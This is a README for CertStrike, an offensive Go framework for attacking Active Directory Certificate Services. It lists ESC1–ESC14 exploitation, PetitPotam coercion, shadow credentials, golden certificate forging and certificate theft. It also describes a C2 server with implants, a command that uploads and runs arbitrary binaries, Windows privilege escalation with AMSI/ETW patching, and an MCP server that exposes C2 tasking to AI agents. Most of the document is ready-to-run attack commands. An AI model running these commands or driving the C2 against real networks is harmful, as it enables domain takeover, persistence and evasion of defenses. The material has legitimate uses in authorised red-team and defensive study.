# CertStrike

## Overview
ADCS exploitation and PKI attack framework with integrated cert-auth C2. Pure Go, CGO-free.

## Architecture
- `cmd/certstrike/` — CLI entry points (cobra commands)
- `pkg/pki/` — ADCS enumeration, ESC1-14 exploitation, certificate enrollment, NTLM auth, PetitPotam coercion, shadow credentials, certificate forging, reporting
- `pkg/c2/` — HTTP/HTTPS C2 listener, session management, cert-auth implants, polling agent, file delivery/deploy
- `internal/mcp/` — MCP stdio server (5 tools)
- `internal/tui/` — Bubbletea operator console with live C2 polling
- `implants/smartpotato/` — Windows potato privilege escalation (JuicyPotato, RoguePotato, SweetPotato)

## Build
```bash
CGO_ENABLED=0 go build -o certstrike ./cmd/certstrike
cd implants/smartpotato && GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
```

## Features

### PKI / ADCS
- ESC1-ESC14 complete detection + exploitation via `--esc 1` through `--esc 14`
- Real certificate enrollment via CA web endpoint (/certsrv/) with NTLM auth
- NTLM pass-the-hash support for enrollment (`--hash` flag, no plaintext password needed)
- ESC1 misconfigured templates (enrollee supplies subject + auth EKU)
- ESC2 Any Purpose EKU templates
- ESC3 Enrollment Agent templates (two-stage attack)
- ESC4 vulnerable template ACLs (full binary ACE parsing, WriteDACL/WriteOwner, LDAP modify + restore)
- ESC5 vulnerable PKI object ACLs on CA
- ESC6 EDITF_ATTRIBUTESUBJECTALTNAME2 on CA enrollment service (SAN injection via request attributes)
- ESC7 vulnerable CA ACLs (ManageCA → enable ESC6 → enroll → restore)
- ESC8 HTTP web enrollment relay detection + PetitPotam coercion trigger
- ESC9 CT_FLAG_NO_SECURITY_EXTENSION detection + UPN swap exploitation (LDAP modify + restore)
- ESC10 weak certificate mapping detection
- ESC11 RPC interface encryption enforcement detection
- ESC12 DCOM interface abuse detection
- ESC13 OID group link abuse detection + exploitation
- ESC14 weak explicit mappings detection
- Shadow Credentials (msDS-KeyCredentialLink add/list/remove, key persisted before LDAP modify)
- Golden certificate forging (self-signed or CA-key signed)
- Auto-pwn orchestration (enumerate → exploit → forge → PKINIT commands)
- Certificate theft playbook (THEFT1-THEFT5) via `--theft 1` through `--theft 5`
- PKINIT command generation (certipy, Rubeus, impacket)
- UnPAC-the-hash command generation
- PetitPotam MS-EFSRPC coercion (SMB2 + DCE/RPC, stateful session)
- WebDAV coercion for non-admin pivot relay (`--listener-port` for custom port >1024)

### C2 Framework
- HTTP/HTTPS listeners with auto-generated TLS certificates
- Session management (register, poll, command queue, result collection)
- Certificate persistence: cert-auth implants via forged certificates (Schannel mTLS)
- Polling agent: `certstrike agent --config stager.json`
- File delivery: upload and deploy arbitrary binaries to agents
- Deploy command: `certstrike deploy --c2-url <url> --session <ID> --file ./payload --path /tmp/svc --execute`
- Agent command output capped at 10MB (OOM prevention)

### SmartPotato (Windows)
- JuicyPotato — BITS COM object abuse + named pipe impersonation
- SweetPotato — PrintSpoofer via Print Spooler named pipe
- RoguePotato — DCE/RPC OXID resolver redirect + DCOM activation (auto netsh port proxy)
- AMSI/ETW patching (AmsiScanBuffer + EtwEventWrite)
- Auto-detect best technique based on running services

### Operational
- LDAPS (`--ldaps`) and StartTLS (`--start-tls`) support
- NTLM pass-the-hash for LDAP bind (`--hash`)
- JSON structured output (`--json`)
- PFX import/export
- Stealth mode (`--stealth`, jittered LDAP queries, small page sizes)
- Engagement reporting (`--report --format markdown`)
- MCP server (5 tools: pki_enumerate, pki_forge, c2_list_sessions, c2_queue_command, c2_get_results)
- TUI operator console with live C2 polling (`certstrike console --c2-url <url>`)

## Key Commands
```bash
# Enumerate
certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass
certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass --ldaps
certstrike pki --enum --target-dc dc01 --domain corp.local -u user --hash aad3b435b51404eeaad3b435b51404ee
certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass --json
certstrike pki --enum --target-dc dc01 --domain corp.local -u user -p pass --stealth

# Exploit (--esc accepts 1-14)
certstrike pki --esc 1 --template Vuln --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
certstrike pki --esc 4 --template WritableTemplate --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
certstrike pki --esc 7 --ca CorpCA --upn admin@corp.local --target-dc dc01 --domain corp.local -u user -p pass
certstrike pki --esc 9 --template NoSecExt --upn admin@corp.local --attacker-dn "CN=..." --target-dc dc01 --domain corp.local -u user -p pass

# Relay attacks with auto-coercion
certstrike pki --esc 8 --template Machine --target-dc dc01 --domain corp.local -u user -p pass --listener-ip 10.0.0.5
certstrike pki --esc 8 --template Machine --target-dc dc01 --domain corp.local -u user -p pass --listener-ip 10.0.0.5 --listener-port 8080

# Certificate operations
certstrike pki --forge --upn admin@corp.local --ca-key ca.key --ca-cert ca.crt
certstrike pki --import-pfx cert.pfx
certstrike pki --theft all
certstrike pki --report --format markdown --output findings.md --target-dc dc01 --domain corp.local -u user -p pass

# Shadow Credentials
certstrike shadow --add --target "CN=victim,CN=Users,DC=corp,DC=local" --target-dc dc01 --domain corp.local -u user -p pass
certstrike shadow --list --target "CN=victim,CN=Users,DC=corp,DC=local" --target-dc dc01 --domain corp.local -u user -p pass
certstrike shadow --remove --target "CN=victim,CN=Users,DC=corp,DC=local" --device-id <guid> --target-dc dc01 --domain corp.local -u user -p pass

# Auto-pwn
certstrike auto --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
certstrike auto --dry-run --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass
certstrike auto -i --target-dc dc01 --domain corp.local --upn admin@corp.local -u user -p pass  # interactive path selection

# C2
certstrike c2 --port 8443 --protocol https
certstrike agent --config stager.json
certstrike deploy --c2-url http://localhost:8443 --session <ID> --file ./stager --path /tmp/svc --execute
certstrike console --c2-url http://localhost:8080
certstrike mcp
```

## Dependencies
All pure Go, CGO_ENABLED=0 compatible:
- `github.com/spf13/cobra` — CLI framework
- `github.com/go-ldap/ldap/v3` — Native LDAP client
- `github.com/charmbracelet/bubbletea` — TUI framework
- `github.com/charmbracelet/lipgloss` — TUI styling
- `software.sslmate.com/src/go-pkcs12` — PKCS12/PFX handling
- NTLM authentication — built-in NTLMv2 implementation with inline MD4 (no external crypto deps)
